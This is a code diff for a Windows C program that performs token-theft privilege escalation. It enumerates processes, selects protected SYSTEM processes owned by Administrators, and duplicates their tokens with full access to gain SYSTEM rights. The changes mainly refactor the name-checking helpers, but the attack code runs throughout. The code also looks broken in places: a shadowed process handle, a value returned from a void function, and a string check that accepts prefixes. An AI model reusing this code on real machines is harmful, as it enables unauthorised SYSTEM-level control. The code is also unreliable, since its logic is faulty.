@@ -39,7 +39,7 @@ int main(void) {
 		printf("[!] Error: Failed to acquire Privileges!\n\n");
 	}
 	else
-		printf("[+] SeDebug & SeRestore Privileges Acquired!\n\n");*/
+		printf("[+] SeRestore Privilege Acquired!\n\n");*/
 
 	snapshot_proc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (snapshot_proc == INVALID_HANDLE_VALUE) {
@@ -71,7 +71,7 @@ int main(void) {
 	if (system_process) {
 		int protection_result = protected_check(each_process.th32ProcessID);
 		if (protection_result) {
-			protected_arr[protected_count].pprotected = each_process; //added protected processes to array
+			protected_arr[protected_count].pprotected = each_process; //added protected processes to array for future use
 			protected_count += 1;
 		}
 	}
@@ -111,7 +111,7 @@ int main(void) {
 int protected_check(DWORD pid) {
 	HANDLE proc_handle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
 	if (proc_handle == NULL) {
-		HANDLE proc_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid); //CHANGED
+		HANDLE proc_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid); //required for protected processes
 		token_elevation(proc_handle);
 		return 1;
 	}
@@ -144,8 +144,9 @@ BOOL system_check(PROCESSENTRY32 process) {
 	return TRUE;
 }
 
-//This function's objective is to get the user of a process
-void GetUserInfo(HANDLE token, PTCHAR account_name, PTCHAR domain_name) {
+//This function's objective is to get the user of a process and check if
+//it is SYSTEM
+BOOL GetUserInfo(HANDLE token, PTCHAR account_name, PTCHAR domain_name) {
 	DWORD token_size, name_size = NAME_ARRAY, domain_size = NAME_ARRAY;
 	PTOKEN_USER token_user;
 	SID_NAME_USE sid_type;
@@ -166,10 +167,33 @@ void GetUserInfo(HANDLE token, PTCHAR account_name, PTCHAR domain_name) {
 		}
 	}
 	free(token_user);
+
+	int comparison = 0;
+	PTCHAR arr_cmp = L"SYSTEM";
+	int arr_length = wcslen(account_name);
+
+	for (int z = 0; z < NAME_ARRAY; z++) {
+		if (*account_name == '\0')
+			break;
+		else if (*account_name == *arr_cmp) {
+			comparison++;
+			account_name++;
+			arr_cmp++;
+		}
+		else
+			break;
+	}
+	if (comparison == arr_length) 
+		return TRUE;
+	else
+		return FALSE;
+
+
 }
 
-//this function's objective is to get the owner of the process
-void GetOwnerInfo(HANDLE token, PTCHAR account_name, PTCHAR domain_name) {
+//this function's objective is to get the owner of the process and check if
+//it is part of the Administrators group
+BOOL GetOwnerInfo(HANDLE token, PTCHAR account_name, PTCHAR domain_name) {
 	DWORD token_size = NULL, name_size = NAME_ARRAY, domain_size = NAME_ARRAY;
 	PTOKEN_OWNER token_owner;
 	SID_NAME_USE sid_type;
@@ -189,14 +213,12 @@ void GetOwnerInfo(HANDLE token, PTCHAR account_name, PTCHAR domain_name) {
 		}
 	}
 	free(token_owner);
-}
 
-//This function serves to compare strings 
-//I couldve used strcmp but i wanted to explore!
-BOOL StringCheck(PTCHAR account_name, PTCHAR arr_cmp, int arr_length) {
 	int comparison = 0;
+	PTCHAR arr_cmp = L"Administrators";
+	int arr_length = wcslen(account_name);
 
-	for (int z = 0; z < NAME_ARRAY; z++) { 
+	for (int z = 0; z < NAME_ARRAY; z++) {
 		if (*account_name == '\0')
 			break;
 		else if (*account_name == *arr_cmp) {
@@ -211,6 +233,7 @@ BOOL StringCheck(PTCHAR account_name, PTCHAR arr_cmp, int arr_length) {
 		return TRUE;
 	else
 		return FALSE;
+
 }
 
 //This function will attempt to duplicate a SYSTEM token and create 
@@ -228,11 +251,9 @@ void token_elevation(HANDLE process) {
 		return 1;
 	}
 
-	GetUserInfo(ptoken, account_name, domain_name);
-	user_check = StringCheck(account_name, L"SYSTEM", wcslen(account_name));
-	GetOwnerInfo(ptoken, account_name, domain_name);
-	owner_check = StringCheck(account_name, L"Administrators", wcslen(account_name));
-
+	user_check = GetUserInfo(ptoken, account_name, domain_name);
+	owner_check = GetOwnerInfo(ptoken, account_name, domain_name);
+	
 	if (user_check & owner_check) {
 		result = DuplicateTokenEx(ptoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &new_token);
 		if (result) {
